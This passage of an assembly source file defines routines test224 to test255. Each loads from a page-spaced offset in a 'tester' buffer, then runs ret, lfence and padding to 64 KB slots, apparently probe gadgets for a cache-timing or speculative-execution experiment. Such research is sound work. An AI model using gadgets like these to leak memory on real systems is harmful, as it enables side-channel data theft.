    filler223: resb (0x1 << 16) - TEST_SIZE

test224:
    mov rax, QWORD[tester+224*4096]
    ret
    lfence
    filler224: resb (0x1 << 16) - TEST_SIZE

test225:
    mov rax, QWORD[tester+225*4096]
    ret
    lfence
    filler225: resb (0x1 << 16) - TEST_SIZE

test226:
    mov rax, QWORD[tester+226*4096]
    ret
    lfence
    filler226: resb (0x1 << 16) - TEST_SIZE

test227:
    mov rax, QWORD[tester+227*4096]
    ret
    lfence
    filler227: resb (0x1 << 16) - TEST_SIZE

test228:
    mov rax, QWORD[tester+228*4096]
    ret
    lfence
    filler228: resb (0x1 << 16) - TEST_SIZE

test229:
    mov rax, QWORD[tester+229*4096]
    ret
    lfence
    filler229: resb (0x1 << 16) - TEST_SIZE

test230:
    mov rax, QWORD[tester+230*4096]
    ret
    lfence
    filler230: resb (0x1 << 16) - TEST_SIZE

test231:
    mov rax, QWORD[tester+231*4096]
    ret
    lfence
    filler231: resb (0x1 << 16) - TEST_SIZE

test232:
    mov rax, QWORD[tester+232*4096]
    ret
    lfence
    filler232: resb (0x1 << 16) - TEST_SIZE

test233:
    mov rax, QWORD[tester+233*4096]
    ret
    lfence
    filler233: resb (0x1 << 16) - TEST_SIZE

test234:
    mov rax, QWORD[tester+234*4096]
    ret
    lfence
    filler234: resb (0x1 << 16) - TEST_SIZE

test235:
    mov rax, QWORD[tester+235*4096]
    ret
    lfence
    filler235: resb (0x1 << 16) - TEST_SIZE

test236:
    mov rax, QWORD[tester+236*4096]
    ret
    lfence
    filler236: resb (0x1 << 16) - TEST_SIZE

test237:
    mov rax, QWORD[tester+237*4096]
    ret
    lfence
    filler237: resb (0x1 << 16) - TEST_SIZE

test238:
    mov rax, QWORD[tester+238*4096]
    ret
    lfence
    filler238: resb (0x1 << 16) - TEST_SIZE

test239:
    mov rax, QWORD[tester+239*4096]
    ret
    lfence
    filler239: resb (0x1 << 16) - TEST_SIZE

test240:
    mov rax, QWORD[tester+240*4096]
    ret
    lfence
    filler240: resb (0x1 << 16) - TEST_SIZE

test241:
    mov rax, QWORD[tester+241*4096]
    ret
    lfence
    filler241: resb (0x1 << 16) - TEST_SIZE

test242:
    mov rax, QWORD[tester+242*4096]
    ret
    lfence
    filler242: resb (0x1 << 16) - TEST_SIZE

test243:
    mov rax, QWORD[tester+243*4096]
    ret
    lfence
    filler243: resb (0x1 << 16) - TEST_SIZE

test244:
    mov rax, QWORD[tester+244*4096]
    ret
    lfence
    filler244: resb (0x1 << 16) - TEST_SIZE

test245:
    mov rax, QWORD[tester+245*4096]
    ret
    lfence
    filler245: resb (0x1 << 16) - TEST_SIZE

test246:
    mov rax, QWORD[tester+246*4096]
    ret
    lfence
    filler246: resb (0x1 << 16) - TEST_SIZE

test247:
    mov rax, QWORD[tester+247*4096]
    ret
    lfence
    filler247: resb (0x1 << 16) - TEST_SIZE

test248:
    mov rax, QWORD[tester+248*4096]
    ret
    lfence
    filler248: resb (0x1 << 16) - TEST_SIZE

test249:
    mov rax, QWORD[tester+249*4096]
    ret
    lfence
    filler249: resb (0x1 << 16) - TEST_SIZE

test250:
    mov rax, QWORD[tester+250*4096]
    ret
    lfence
    filler250: resb (0x1 << 16) - TEST_SIZE

test251:
    mov rax, QWORD[tester+251*4096]
    ret
    lfence
    filler251: resb (0x1 << 16) - TEST_SIZE

test252:
    mov rax, QWORD[tester+252*4096]
    ret
    lfence
    filler252: resb (0x1 << 16) - TEST_SIZE

test253:
    mov rax, QWORD[tester+253*4096]
    ret
    lfence
    filler253: resb (0x1 << 16) - TEST_SIZE

test254:
    mov rax, QWORD[tester+254*4096]
    ret
    lfence
    filler254: resb (0x1 << 16) - TEST_SIZE

test255:
    mov rax, QWORD[tester+255*4096]
    ret
    lfence
    filler255: resb (0x1 << 16) - TEST_SIZE
filler256: resb (0x32 << 20)

